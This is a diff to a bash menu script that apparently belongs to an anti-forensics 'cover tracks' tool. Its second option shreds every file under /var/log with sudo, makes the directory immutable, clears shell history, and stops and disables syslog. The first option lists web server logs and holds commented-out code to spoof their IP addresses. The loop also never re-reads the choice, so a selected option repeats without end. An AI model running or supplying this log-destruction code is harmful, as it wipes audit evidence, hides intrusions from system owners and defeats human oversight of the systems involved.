@@ -1,30 +1,57 @@
 #!/usr/bin/env bash
 
-# --- all vars are exported in main script line:71 --- 
+# --- all vars are exported in main script line:71 ---
 # shellcheck disable=SC2154
 
 echo -e "${RED}$(line)${EOC}"
 echo -e "${RED}[1]${EOC} - ${RED}Spoof${EOC} with ${RED}random IP's${EOC}"
 echo -e "$(line)"
-echo -e "${RED}[2]${EOC} - ${RED}Delete${EOC} via ${RED}shred${EOC} and ${RED}disable${EOC}"
+echo -e "${RED}[2]${EOC} - ${RED}Delete${EOC}|${RED}disable${EOC} /var/log/* via ${RED}shred${EOC}"
+echo -e "$(line)"
+echo -e "${RED}[0]${EOC} - ${RED}Return${EOC} to menu"
 echo -e "${RED}$(line)${EOC}"
-echo 
+echo
 read -rp $'\033[0;91m[*]\e[0m Enter your choice > ' logs_choice
 
-while true:
-do
+while :; do
     case $logs_choice in
         1)
-            echo 1;
-
-        ;;
-        2) echo 2;;
-
-
+            if [[ -d "/var/log/apache2" && -r "/var/log/apache2" && -d "/var/log/nginx" && -r "/var/log/nginx" ]]; then 
+                mapfile -t LOG_FILES < <(find /var/log/apache2 /var/log/nginx -type f 2> /dev/null | grep -Ev "\.(zip|tar|gz|bz2|xz|rar|7z|tar\.gz|tar\.bz2|tar\.xz|journal|journal~|dat)$")
+                if [ ${#LOG_FILES[@]} -gt 0 ]; then
+                    echo -e "${RED}[+]${EOC} \"Web servers logs\" exists. Listing all logs:"
+                    printf "%s\n" "${LOG_FILES[@]}" | column
+                    # --- Spoof logs with random IPs ---
+                    # for log_file in "${LOG_FILES[@]}"; do
+                    #     sudo "$current_shell" -c "anonip -4 32 -6 32 -i $RANDOM$RANDOM --input $log_file -o /tmp/logs/$(basename "$log_file")"
+                    # done
+                    echo soon
+                else
+                    echo -e "${RED}[x]${EOC} No log files found in \"/var/log\""
+                fi
+            else
+                echo "${RED}[x]${EOC} Directory doesn't exist or is not readable"
+            fi; ;;
+        2)
+            if [ -d "/var/log" ] && [ -r "/var/log" ]; then
+                echo -e "${RED}[+]${EOC} Shredding and disabling logs in /var/log/*"
+                find /var/log -type f 2> /dev/null | while read -r log_file; do
+                    sudo shred -u "$log_file"
+                done
+                sudo chattr +i /var/log/; sudo "$current_shell" -c "history -c"
+                if sudo systemctl stop syslog && sudo systemctl disable syslog; then
+                    echo -e "${RED}[+]${EOC} Syslog stopped & disabled ${RED}SUCCESSFULY${EOC}"
+                else 
+                    echo -e "${RED}[x]${EOC} Cannot stop & disable syslog\n"
+                fi
+            else
+                echo "${RED}[x]${EOC} Directory doesn't exist or is not readable"
+            fi; ;;
         0)
-            sleep 1 && break && return 0;;
+            echo "Exiting..."
+            sleep 1
+            break; ;;
         *)
-            echo -e "${RED}[x]${EOC} Invalid option\n"
-            sleep 0.5 && logs;;
-    esac;
-done;
+            echo "Invalid option"; ;;
+    esac
+done
